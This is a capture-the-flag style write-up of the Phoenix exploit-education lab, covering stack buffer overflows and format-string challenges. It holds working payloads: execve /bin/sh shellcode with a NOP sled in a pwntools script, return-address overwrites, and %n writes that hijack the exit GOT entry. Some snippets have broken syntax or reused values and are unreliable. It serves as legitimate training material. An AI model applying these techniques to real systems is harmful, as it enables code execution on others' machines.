# Phoenix: is basic binar exploitation challenge:
---

### Note: challenges are located in /opt/phoenix/amd64
---

# All stack Challenges:

---

## Stack0:
- gets take un check data which could be used to create the buffer over flow:

```
python -c 'print("A"*70)' | ./stack_zero

```

## Stack1:

- The challenge is similar to the above challenge but one has to look for following things:
  1- read the little-Endians -> which store data from large to smaller values, so after the overflow provide the variables value in reverse order
  2- In the code the user provided input is taken as the argument in the for of ``` char ***argv ``` which is then copied to the buffer of length 64 buffer[64]:
  
  ```
   strcpy(locals.buffer, argv[1]);
  ```
  
  ==Note==: The file takes the input as the argument so we can not pass as the pipe it will give us the error instead we will do this:
  ```
  /stack-one $(python -c 'print("A" * 65 + "\x62\x59\x6c\x49")')
  
  ```
## Stack2:
- In this challenge code is using the envirnment variable with the name of ==ExploitateEducation== to be passed as the argument in the stack.
- so in order make the buffer overflow happen we will do :
```
export ExploitEducation = $(python -c 'print("A" * 65 + \x0a\x09\x0a\x0d)')

```
Simply run the function and we will have the over flow.

## stack3:

- In the stack three one has to first find the address of the complete_level function:
```
objdump -d ./stack-three | grep complete_level
000000000040069d <complete_level>:

```
```
0x40069d
python -c 'print "A" * 64 + "\x9d\x06\x40"' | ./stack-three
```

## stack4

- In this challenge the buffer ovflow occurs in the start_level funtions which is called in the main() function:

```

void start_level() {
  char buffer[64];
  void *ret;

  gets(buffer);

  ret = __builtin_return_address(0);
  printf("and will be returning to %p\n", ret);
}

int main(int argc, char **argv) {
  printf("%s\n", BANNER);
  start_level();
}


```

- What we have to do is:
  1- overflow the stack buffer until it reach the return address of strart_level() function
  2- keep in mind all the functions returns addressess are saved on the stack.
  3- the return address of the start_level will also be present on the stack.
  
- How to find the write amount of characters to overflow the buffer:
  1- open the program in the gdb.
  2- place the breakpoint after the gets() function.
  3- fill the buffer with dummy data:
	  ```
	  run < <(python -c 'print("A" * 64)')
	  ```
  4- Now find the location of overflowed function:
	  ```
	  x/100x $rsp // rsp is the stack pointer it is the top most address of the stack
	  ```
  5- the above prompt will dump the address and data stored on the stack in form of hex.
  6- The top left address will mostly likely show the overflowed buffer.
  7- next step is to find the return address of start_level which could by find by:
	  ```
	  info frame // the <saved $rip=????> will be the return address of the start level function
	  ```
  8- To calculate the right amount of characters to reach the start_level return address one can subtract the address of overflowed buffer with the return address
  of the start_level function.
  
	  ```
	  0x7fffffffe4f8 - 0x7fffffffe4a0 = 0x58 
	  which in decimal is = 88
	  ```
  9- Now to curate a payload:
	  ```
	  python -c 'print("A" * 88 + "\x1d\x06\x40")' | ./stack-four
	  ```
## stack 5

- In this challenge one has to inject the the shell code which will return a /bin/sh shell $
- How to approach the problem:
  1- Inject the shellcode on the stack.
  2- change the return address and point it towards the shell code
  3- lastly the shell will execute.

- Procedure of Payload creation:
		1- first copy a shell code from the internet and convert it into little endian hex format:
   		```
	'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff' \
	'\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'	
	```
		2- In the begining of the buffer according to your choice add the NOP -> No operation in the stack:
			```
		'\x90' * 30 // here hex for NOP is \x90 and 30 is number of times we want to insert it.
		```
		3- after adding the NOP now add the shellcode which is defined previously.
		4- The Purpose of NOP is to make the shell land where we want to land it and exclude any discrepancy which comes 
		in the way.
		5- keep in the view that total lenth of buffer is 128, of which we 30 has been defined for the NOP operators.
		6- after the NOP code and shellcode, add the buffer over flow script which is:
			```
		python -c 'print("A" * 98)' // we are multipling it with 98 because 30 are already allocated.
		```
		7- At last overwrite the value of RBP buffer to 8 bit digits as BBBBBBBB.
		8- open the executable in the gdb and set the break point after the gets() function in the 
		start_level function.
		9- then run the code as:
		```
		run < <(python payload.py)
		```
		10- open the info frame and see where is the start_level function will return after the excution:
		```
		gef> info frame
		Stack level 0, frame at 0x7fffffffe520:
		rip = 0x4005a1 in start_level; saved rip = 0x7fffffffe480
		called by frame at 0x7fffffffe528
		Arglist at 0x7fffffffe510, args: 
		Locals at 0x7fffffffe510, Previous frame's sp is 0x7fffffffe520
		Saved registers:
		rbp at 0x7fffffffe510, rip at 0x7fffffffe518

		```
			- here is the saved rip = 0x7fffffffe480 is where the start_level will return 
		11- Use the pwn tool 
	

		```
			from pwn import *
			import sys

		shellcode = '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff' \
            '\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'
		buff  = '\x90' * 30                 # NOP sled
		buff += shellcode                  # Shellcode
		buff += 'A' * (128 - len(buff))    # Padding to reach saved RBP
		buff += 'BBBBBBBB'                 # Fake RBP
		buff += p64(0x7fffffffe480)        # Overwritten RIP // execute the code and analyse the stack to see were your shellcode is starting and replace it with that.


		sys.stdout.write(buff)

		```

To run the code:
```
(python payload.py; cat) | /opt/phoenix/amd64/stack-five
```



---


---


---

# Format string Challenges:
---
## Format-Zero:

- The format string vulnerability occurs when output is directly passed to the prinf() or sprintf() like:

	```
	char[100] name;
	scanf(name);
	printf(name);
	```
	
- Here in the printf function the type is not specified before the name user can pass it on type as %x, %n, %i, %p etc.

- which will pop of the data from the stack and show it on the screen:

	```
	user@phoenix-amd64:/opt/phoenix/amd64$ python -c "print '%p' * 3" | ./format-zero 
	Welcome to phoenix/format-zero, brought to you by https://exploit.education
	Well done, the 'changeme' variable has been changed!
	
	```
- Here I have provided three %p pointer types it will go into stack and print the values stored at 0, 1 and 2 on the screen, as shown.


## Format-One:

- In the next challenge we will pop of four values and then change the last one with the provided address in the little endian format:

	```
	user@phoenix-amd64:/opt/phoenix/amd64$ python -c "print '%p' * 4 + '\x6c\x4f\x76\x45'" | ./format-zero 
	Welcome to phoenix/format-zero, brought to you by https://exploit.education
	Well done, the 'changeme' variable has been changed!

	```


## Format-Two:

- To solve this we have find the address of **changeme** variables address from the **32 bit** binary located in **i486** directory.
- use the objdump or gdb to get the address rest is similar pop off the data from the stack until it reaches and changes the changemes value:

	```
	user@phoenix-amd64:/opt/phoenix/i486$ ./format-two $'\x68\x98\x04\x08%x %x %x %x %x %x %x %x %x %x %x %n \n'
	Welcome to phoenix/format-two, brought to you by https://exploit.education
	hffffd7d3 100 0 f7f84b67 ffffd610 ffffd5f8 80485a0 ffffd4f0 ffffd7d3 100 3e8  
	Well done, the 'changeme' variable has been changed correctly!

	```



## Format-Three:

- Like the previous challenge in which we were required to wirte to specific area for memory.

- In this challenge we are required to write specific value to certain portion of memory.

- The steps involved includes:
  1- Getting the location of int changeme which is global variable:
	  ```
	  user@phoenix-amd64:~$ nm /opt/phoenix/i486/format-three | grep changeme
	  08049844 B changeme
	  
	  ```
  2- crafting a payload:
  
  ```
  from pwn import *
  changeme = 0x8049844
  
  ```
  3- keep in mind the int variable takes 4 bytes of space when build in 32 bit binary and 8 in 64 bit binary where 1 byte = 8 bits
  4- So the value of changeme will be spaned on **0x8049844** **0x8049845** **0x8049846** **0x8049847**.
  5- Lets make it little endian using the pwn tools **p32()**
	  ```
	  buff = ""
	  buff += p32(changeme + 0)
	  buff += p32(changeme + 1)
	  buff += p32(changeme + 2)
	  buff += p32(changeme + 3)
	  ```
  6- Poping the values of the stack until we reach the desired location usin the **%x**
  7- On the previous testing I came to know the provided value is shown at the 12 position(offset) so:
	  ```
	  buff += "%x"*11
	  ```
  8- Now adding the values four times as the int is 4 bytes long:
  
	  ```
	  buff += "A"*244
	  buff += "%n"
	  
	  buff += "A"*51
	  buff += "%n"
	  
	  buff += "A"*205
	  buff += "%n"
	  
	  buff += "A"*31
	  buff += "%n"
	  ```
	  
  9- lastly pass the payload as the input:
  
  ```
  print(buff)
  
  ```
  
  **complete code:**
  
  ```
  from pwn import *
  changeme = 0x8049844 
  
  buff = ""
  buff += p32(changeme + 0)
  buff += p32(changeme + 1)
  buff += p32(changeme + 2)
  buff += p32(changeme + 3) 

  buff += "A"*244
  buff += "%n"
	  
  buff += "A"*51
  buff += "%n"
	  
  buff += "A"*205
  buff += "%n"
	  
  buff += "A"*31
  buff += "%n"
  
  print(buff)
  ```
  
  **output:**
  ```
  user@phoenix-amd64:~$ python format-four.py | /opt/phoenix/i486/format-three 
  Welcome to phoenix/format-three, brought to you by https://exploit.education
  DEFG0 0 0 f7f81cf7 f7ffb000 ffffd618 8048556 ffffc610 ffffc610 fff 0 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
  Well done, the 'changeme' variable has been changed correctly!

  ```

## Format-Four:

- Similar to the previous challenge where we have to write specific value on certain location in the memory in this challenge we have redirect the execuation of congratulation_function so that it gets 
executed.

- we will hijack the **exit** call in the bounce function and instead by replacing it with the address of **congratulation**.
- To do that we have to first get the address of **exit()** function using:

```
 objdump -M intel -R /opt/phoenix/i486/format-four
 
```

- using the previous code we only had to change the address in the changeme to the address of the exit function the code will be as:

```
from pwn import *
  exit = 0x080497e4 
  
  buff = ""
  buff += p32(exit + 0)
  buff += p32(exit + 1)
  buff += p32(exit + 2)
  buff += p32(exit + 3) 

  buff += "A"*244
  buff += "%n"
	  
  buff += "A"*51
  buff += "%n"
	  
  buff += "A"*205
  buff += "%n"
	  
  buff += "A"*31
  buff += "%n"
  
  print(buff)


```

